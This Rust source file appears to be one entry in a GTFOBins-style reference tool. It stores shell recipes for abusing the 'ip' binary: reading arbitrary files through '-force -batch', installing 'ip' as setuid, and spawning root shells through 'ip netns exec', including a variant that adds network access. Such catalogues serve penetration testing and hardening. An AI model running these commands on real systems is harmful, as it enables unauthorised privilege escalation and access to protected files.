pub static BIN_NAME: &'static str = "ip";
pub static BIN_DESC: &'static str = "The read file content is corrupted by error prints.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    ip -force -batch "$LFILE"
"#;
pub static SUID_CODE_1: &'static str = r#"
    
    sudo install -m =xs $(which ip) .

    LFILE=file_to_read
    ./ip -force -batch "$LFILE"
"#;
pub static SUID_DESC_2: &'static str = "This only works for Linux with CONFIG_NET_NS=y";
pub static SUID_CODE_2: &'static str = r#"
    
    sudo install -m =xs $(which ip) .

    ./ip netns add foo
    ./ip netns exec foo /bin/sh -p
    ./ip netns delete foo
"#;
pub static SUDO_CODE_1: &'static str = r#"
    
    LFILE=file_to_read
    sudo ip -force -batch "$LFILE"
"#;
pub static SUDO_DESC_2: &'static str = "This only works for Linux with CONFIG_NET_NS=y";
pub static SUDO_CODE_2: &'static str = r#"
    
    sudo ip netns add foo
    sudo ip netns exec foo /bin/sh
    sudo ip netns delete foo
"#;
pub static SUDO_DESC_3: &'static str =
    "This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.";
pub static SUDO_CODE_3: &'static str = r#"
    
    sudo ip netns add foo
    sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
    sudo ip netns exec bar /bin/sh
    sudo ip netns delete foo
    sudo ip netns delete bar
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID_1: Code<'static> = Code {
    title: "SUID_CODE_1",
    code: SUID_CODE_1,
    tag: Tag::SUID,
};
pub static SUID_2: Code<'static> = Code {
    title: "SUID_CODE_2",
    code: SUID_CODE_2,
    tag: Tag::SUID,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static SUDO_3: Code<'static> = Code {
    title: "SUDO_CODE_3",
    code: SUDO_CODE_3,
    tag: Tag::SUDO,
};
